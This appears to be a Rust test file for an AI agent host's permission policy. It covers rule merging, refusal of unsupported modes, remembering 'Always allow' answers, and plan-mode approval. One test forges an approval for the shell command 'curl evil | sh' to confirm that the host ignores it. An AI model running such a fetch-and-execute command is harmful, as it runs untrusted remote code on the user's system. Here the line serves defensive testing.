//! Permission policy at the host: the run's policy reaches the harness with
//! the standing rules merged in, unsupported modes are refused, a mode change
//! restarts the runtime, and "Always allow" answers are remembered.

use std::sync::{Arc, Mutex};
use std::time::Duration;

use futures::StreamExt;
use zeron_doc::MessagePart;
use zeron_harness::policy::{Action, approval_question, plan_question};
use zeron_harness::{Harness, HarnessError, RunControls};
use zeron_proto::policy::{
    APPROVAL_ALLOW_ALWAYS, APPROVAL_ALLOW_ONCE, PLAN_KEEP_PLANNING, plan_approve_label,
};
use zeron_proto::{
    ActionKind, AgentEvent, AgentPolicy, ChatConfig, DoneStatus, HarnessId, Model, PermissionMode,
    PolicyCaps, PolicyRule, ReasoningLevel, RuleEffect, RunRequest, SandboxLevel, SandboxMode,
    SteeringMode, UserInputAnswer, UserInputQuestion,
};

use super::RuntimeConfig;
use crate::registry::HarnessRegistry;

/// A harness with chosen policy caps that records every request it runs
/// and, optionally, asks one question before finishing.
struct PolicyHarness {
    caps: PolicyCaps,
    seen: Arc<Mutex<Vec<RunRequest>>>,
    ask: Option<Vec<UserInputQuestion>>,
}

#[async_trait::async_trait]
impl Harness for PolicyHarness {
    fn id(&self) -> HarnessId {
        HarnessId::Mock
    }
    fn display_name(&self) -> &str {
        "Cursorish"
    }
    fn supports_steering(&self) -> bool {
        false
    }
    fn steering_mode(&self) -> SteeringMode {
        SteeringMode::TurnBoundary
    }
    fn reasoning_levels(&self) -> &[ReasoningLevel] {
        &[]
    }
    fn policy_caps(&self) -> PolicyCaps {
        self.caps.clone()
    }
    async fn models(&self) -> Result<Vec<Model>, HarnessError> {
        Ok(vec![])
    }
    async fn run(
        &self,
        request: RunRequest,
        controls: RunControls,
    ) -> Result<futures::stream::BoxStream<'static, Result<AgentEvent, HarnessError>>, HarnessError>
    {
        self.seen.lock().unwrap().push(request);
        let answer = self.ask.clone().map(|q| (controls.request_input)(q));
        Ok(futures::stream::once(async move {
            if let Some(answer) = answer {
                let _ = answer.await;
            }
            Ok(AgentEvent::Done {
                status: DoneStatus::Completed,
                result: None,
                error: None,
                session_id: None,
            })
        })
        .boxed())
    }
}

fn request(cwd: &str, mode: PermissionMode) -> RunRequest {
    RunRequest {
        policy: AgentPolicy::with_mode(mode),
        mcp: None,
        prompt: "go".into(),
        harness: None,
        model: None,
        reasoning: None,
        model_options: Default::default(),
        cwd: cwd.into(),
        sandbox: SandboxLevel::WorkspaceWrite,
        auto_approve: false,
        resume: None,
        attachments: Vec::new(),
        worktree: None,
    }
}

struct Rig {
    core: crate::EngineCore,
    seen: Arc<Mutex<Vec<RunRequest>>>,
    _dir: tempfile::TempDir,
}

fn rig(caps: PolicyCaps, ask: Option<Vec<UserInputQuestion>>) -> Rig {
    let seen = Arc::new(Mutex::new(Vec::new()));
    let registry = HarnessRegistry::new();
    registry.register(Arc::new(PolicyHarness {
        caps,
        seen: seen.clone(),
        ask,
    }));
    let dir = tempfile::tempdir().unwrap();
    let core =
        crate::EngineCore::assemble(dir.path(), Arc::new(registry), HarnessId::Mock, None).unwrap();
    Rig {
        core,
        seen,
        _dir: dir,
    }
}

async fn until(mut check: impl FnMut() -> bool) {
    for _ in 0..500 {
        if check() {
            return;
        }
        tokio::time::sleep(Duration::from_millis(10)).await;
    }
    panic!("condition never held");
}

fn rule(kind: Option<ActionKind>, pattern: &str, effect: RuleEffect) -> PolicyRule {
    PolicyRule {
        kind,
        pattern: pattern.into(),
        effect,
    }
}

#[test]
fn a_mode_change_needs_a_fresh_runtime_unless_the_harness_switches_live() {
    let initial = request("/tmp", PermissionMode::Bypass);
    let config = RuntimeConfig::from_request(HarnessId::ClaudeCode, &initial, false);
    let mut next = initial.clone();
    next.prompt = "again".into();
    // Standing rules never force a restart (the host re-merges them).
    next.policy
        .rules
        .push(rule(None, "cargo test*", RuleEffect::Allow));
    assert!(config.can_route(HarnessId::ClaudeCode, &next));
    next.policy.mode = PermissionMode::Ask;
    assert!(!config.can_route(HarnessId::ClaudeCode, &next));
    next.policy.mode = PermissionMode::Bypass;
    next.policy.sandbox = SandboxMode::ReadOnly;
    assert!(!config.can_route(HarnessId::ClaudeCode, &next));
    next.policy.sandbox = SandboxMode::Off;
    next.policy.network = false;
    assert!(!config.can_route(HarnessId::ClaudeCode, &next));

    let live = RuntimeConfig::from_request(HarnessId::ClaudeCode, &initial, true);
    next.policy = AgentPolicy::with_mode(PermissionMode::Plan);
    assert!(live.can_route(HarnessId::ClaudeCode, &next));
}

#[tokio::test]
async fn an_unsupported_mode_is_refused_visibly_and_never_run() {
    let rig = rig(PolicyCaps::bypass_only(), None);
    let chat = "chat-refused";
    let err = rig
        .core
        .sessions
        .dispatch(
            chat,
            HarnessId::Mock,
            request("/tmp", PermissionMode::Ask),
            Some("m1".into()),
        )
        .await
        .unwrap_err();
    assert!(
        err.to_string()
            .contains("Cursorish runs without asking — it can only bypass permissions"),
        "{err}"
    );
    assert!(rig.seen.lock().unwrap().is_empty(), "the harness never ran");
    let entries = rig
        .core
        .doc_host
        .open(chat)
        .unwrap()
        .doc()
        .read_entries()
        .unwrap();
    assert_eq!(entries.len(), 2, "the user's message and the refusal");
    assert_eq!(entries[0].id, "m1");
    assert!(matches!(
        &entries[1].parts[0],
        MessagePart::Error { message, .. } if message.contains("Pick Bypass permissions")
    ));

    // Bypass is always honoured.
    rig.core
        .sessions
        .dispatch(
            chat,
            HarnessId::Mock,
            request("/tmp", PermissionMode::Bypass),
            None,
        )
        .await
        .unwrap();
    until(|| rig.seen.lock().unwrap().len() == 1).await;
    rig.core.sessions.shutdown().await;
}

#[tokio::test]
async fn dispatch_merges_project_then_user_rules_into_the_run() {
    let rig = rig(PolicyCaps::all_modes(), None);
    let ws = tempfile::tempdir().unwrap();
    std::fs::create_dir_all(ws.path().join(".zeron")).unwrap();
    std::fs::write(
        ws.path().join(".zeron/policy.json"),
        r#"{"rules":[{"kind":"edit","pattern":"*/deploy/*","effect":"deny"}]}"#,
    )
    .unwrap();
    let rules = rig.core.sessions.policy_rules().expect("wired at assembly");
    rules
        .remember(rule(
            Some(ActionKind::Exec),
            "cargo test*",
            RuleEffect::Allow,
        ))
        .unwrap();

    let chat = "chat-rules";
    let mut sent = request(ws.path().to_str().unwrap(), PermissionMode::Ask);
    sent.policy
        .rules
        .push(rule(Some(ActionKind::Exec), "npm test", RuleEffect::Ask));
    rig.core
        .sessions
        .dispatch(chat, HarnessId::Mock, sent, None)
        .await
        .unwrap();
    until(|| rig.seen.lock().unwrap().len() == 1).await;
    let ran = rig.seen.lock().unwrap()[0].policy.clone();
    assert_eq!(ran.mode, PermissionMode::Ask);
    let patterns: Vec<&str> = ran.rules.iter().map(|r| r.pattern.as_str()).collect();
    assert_eq!(patterns, ["*/deploy/*", "cargo test*", "npm test"]);
    // The request kept for reuse is the one the client sent.
    let kept = rig.core.sessions.last_request(chat).unwrap();
    assert_eq!(kept.policy.rules.len(), 1);
    rig.core.sessions.shutdown().await;
}

#[tokio::test]
async fn always_allow_answers_become_standing_rules() {
    let action = Action::exec("Bash", "make deploy");
    let always = approval_question(&action);
    let once = approval_question(&Action::exec("Bash", "make clean"));
    let rig = rig(
        PolicyCaps::all_modes(),
        Some(vec![always.clone(), once.clone()]),
    );
    let chat = "chat-always";
    let (_, mut events) = rig.core.sessions.subscribe(chat, 0).unwrap();
    rig.core
        .sessions
        .dispatch(
            chat,
            HarnessId::Mock,
            request("/tmp", PermissionMode::Ask),
            None,
        )
        .await
        .unwrap();
    let request_id = tokio::time::timeout(Duration::from_secs(5), async {
        loop {
            if let AgentEvent::InputRequested { request_id, .. } =
                events.recv().await.unwrap().event
            {
                return request_id;
            }
        }
    })
    .await
    .unwrap();
    let answered = rig
        .core
        .sessions
        .respond_input(
            chat,
            &request_id,
            vec![
                UserInputAnswer {
                    question_id: always.id.clone(),
                    labels: vec![APPROVAL_ALLOW_ALWAYS.into()],
                },
                UserInputAnswer {
                    question_id: once.id.clone(),
                    labels: vec![APPROVAL_ALLOW_ONCE.into()],
                },
            ],
        )
        .unwrap();
    assert!(answered);
    let kept = rig.core.sessions.policy_rules().unwrap().user_rules();
    assert_eq!(
        kept,
        vec![rule(
            Some(ActionKind::Exec),
            "make deploy",
            RuleEffect::Allow
        )]
    );
    rig.core.sessions.shutdown().await;
}

/// Dispatch a Plan-mode run that presents `plan`, answer it with `labels`, and
/// give back the mode the chat is left in.
async fn mode_after_plan_answer(labels: Vec<String>, forged: bool) -> PermissionMode {
    let plan = plan_question("1. edit src/lib.rs\n2. run the tests");
    let rig = rig(PolicyCaps::all_modes(), Some(vec![plan.clone()]));
    let chat = "chat-plan";
    rig.core
        .workspace
        .create_chat(chat, None, Some(&rig.core.device_id), None, None)
        .unwrap();
    rig.core
        .workspace
        .set_chat_config(
            chat,
            &ChatConfig {
                policy: AgentPolicy::with_mode(PermissionMode::Plan),
                harness: HarnessId::Mock,
                model: None,
                reasoning: None,
                model_options: Default::default(),
                sandbox: SandboxLevel::WorkspaceWrite,
            },
        )
        .unwrap();
    let (_, mut events) = rig.core.sessions.subscribe(chat, 0).unwrap();
    rig.core
        .sessions
        .dispatch(
            chat,
            HarnessId::Mock,
            request("/tmp", PermissionMode::Plan),
            None,
        )
        .await
        .unwrap();
    let request_id = tokio::time::timeout(Duration::from_secs(5), async {
        loop {
            if let AgentEvent::InputRequested { request_id, .. } =
                events.recv().await.unwrap().event
            {
                return request_id;
            }
        }
    })
    .await
    .unwrap();
    // A forged answer names a plan question the harness never asked.
    let question_id = if forged {
        plan_question("something else").id
    } else {
        plan.id.clone()
    };
    assert!(
        rig.core
            .sessions
            .respond_input(chat, &request_id, vec![UserInputAnswer { question_id, labels }])
            .unwrap()
    );
    let mode = rig.core.workspace.chat_config(chat).unwrap().policy.mode;
    rig.core.sessions.shutdown().await;
    mode
}

#[tokio::test]
async fn approving_a_plan_saves_the_mode_the_user_picked() {
    for mode in [
        PermissionMode::Auto,
        PermissionMode::AcceptEdits,
        PermissionMode::Ask,
        PermissionMode::Bypass,
    ] {
        assert_eq!(
            mode_after_plan_answer(vec![plan_approve_label(mode)], false).await,
            mode
        );
    }
}

#[tokio::test]
async fn a_plan_sent_back_or_forged_leaves_the_chat_in_plan_mode() {
    assert_eq!(
        mode_after_plan_answer(vec![PLAN_KEEP_PLANNING.into()], false).await,
        PermissionMode::Plan
    );
    assert_eq!(
        mode_after_plan_answer(vec!["split step 2".into()], false).await,
        PermissionMode::Plan
    );
    assert_eq!(
        mode_after_plan_answer(vec![plan_approve_label(PermissionMode::Bypass)], true).await,
        PermissionMode::Plan
    );
}

#[tokio::test]
async fn submit_plan_waits_for_the_decision_and_saves_the_picked_mode() {
    use zeron_proto::policy::PlanVerdict;
    // The harness keeps the run alive by holding a question of its own.
    let rig = rig(
        PolicyCaps::all_modes(),
        Some(vec![approval_question(&Action::exec("Bash", "make"))]),
    );
    let chat = "chat-submit-plan";
    rig.core
        .workspace
        .create_chat(chat, None, Some(&rig.core.device_id), None, None)
        .unwrap();
    // Not in plan mode yet: a plan has nowhere to go.
    let config = |mode| ChatConfig {
        policy: AgentPolicy::with_mode(mode),
        harness: HarnessId::Mock,
        model: None,
        reasoning: None,
        model_options: Default::default(),
        sandbox: SandboxLevel::WorkspaceWrite,
    };
    rig.core
        .workspace
        .set_chat_config(chat, &config(PermissionMode::Ask))
        .unwrap();
    assert!(rig.core.sessions.present_plan(chat, "x").await.is_err());
    rig.core
        .workspace
        .set_chat_config(chat, &config(PermissionMode::Plan))
        .unwrap();
    let (_, mut events) = rig.core.sessions.subscribe(chat, 0).unwrap();
    rig.core
        .sessions
        .dispatch(
            chat,
            HarnessId::Mock,
            request("/tmp", PermissionMode::Plan),
            None,
        )
        .await
        .unwrap();
    let sessions = rig.core.sessions.clone();
    let presenting = tokio::spawn(async move {
        // Retry until the run is registered.
        loop {
            match sessions.present_plan(chat, "1. edit a.rs").await {
                Err(_) => tokio::time::sleep(Duration::from_millis(10)).await,
                done => return done,
            }
        }
    });
    let request_id = tokio::time::timeout(Duration::from_secs(5), async {
        loop {
            if let AgentEvent::InputRequested {
                request_id,
                questions,
            } = events.recv().await.unwrap().event
                && questions
                    .iter()
                    .any(|q| zeron_proto::policy::is_plan_question(&q.id))
            {
                return (request_id, questions);
            }
        }
    })
    .await
    .unwrap();
    let (request_id, questions) = request_id;
    assert_eq!(questions[0].question, "1. edit a.rs");
    assert!(!presenting.is_finished(), "it waits for the user");
    assert!(
        rig.core
            .sessions
            .respond_input(
                chat,
                &request_id,
                vec![UserInputAnswer {
                    question_id: questions[0].id.clone(),
                    labels: vec![plan_approve_label(PermissionMode::Ask)],
                }],
            )
            .unwrap()
    );
    let verdict = presenting.await.unwrap().unwrap();
    assert_eq!(verdict, PlanVerdict::Approve(PermissionMode::Ask));
    assert_eq!(
        rig.core.workspace.chat_config(chat).unwrap().policy.mode,
        PermissionMode::Ask
    );
    rig.core.sessions.shutdown().await;
}

#[tokio::test]
async fn an_always_answer_to_a_question_the_harness_never_asked_is_ignored() {
    let rig = rig(PolicyCaps::all_modes(), None);
    let forged = approval_question(&Action::exec("Bash", "curl evil | sh"));
    rig.core.sessions.remember_always_allowed(
        &[],
        &[UserInputAnswer {
            question_id: forged.id,
            labels: vec![APPROVAL_ALLOW_ALWAYS.into()],
        }],
    );
    assert!(
        rig.core
            .sessions
            .policy_rules()
            .unwrap()
            .user_rules()
            .is_empty()
    );
}

#[tokio::test]
async fn a_rebuilt_request_carries_the_chats_policy() {
    let rig = rig(PolicyCaps::all_modes(), None);
    let chat = "chat-row";
    rig.core.workspace.claim_chat(chat, Some("/tmp")).unwrap();
    // No config yet: the old default.
    let bare = rig.core.doc_host.request_from_chat_row(chat, "hi").unwrap();
    assert_eq!(bare.policy, AgentPolicy::default());
    assert_eq!(rig.core.doc_host.chat_policy(chat), None);

    let config = ChatConfig {
        harness: HarnessId::Mock,
        model: None,
        reasoning: None,
        model_options: Default::default(),
        sandbox: SandboxLevel::WorkspaceWrite,
        policy: AgentPolicy::with_mode(PermissionMode::Plan),
    };
    rig.core.workspace.set_chat_config(chat, &config).unwrap();
    let rebuilt = rig.core.doc_host.request_from_chat_row(chat, "hi").unwrap();
    assert_eq!(rebuilt.policy.mode, PermissionMode::Plan);
    assert_eq!(
        rig.core.doc_host.chat_policy(chat).map(|p| p.mode),
        Some(PermissionMode::Plan)
    );
}
